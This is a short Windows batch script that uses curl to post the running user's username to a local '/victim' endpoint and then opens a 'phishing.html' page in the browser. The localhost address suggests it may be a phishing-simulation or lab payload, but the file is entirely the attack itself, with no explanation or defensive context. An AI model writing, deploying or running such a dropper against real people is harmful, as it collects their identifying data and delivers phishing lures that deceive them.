@echo off
curl -X POST -F task=%USERNAME% http://127.0.0.1:8787/victim
start http://127.0.0.1:8787/phishing.html
exit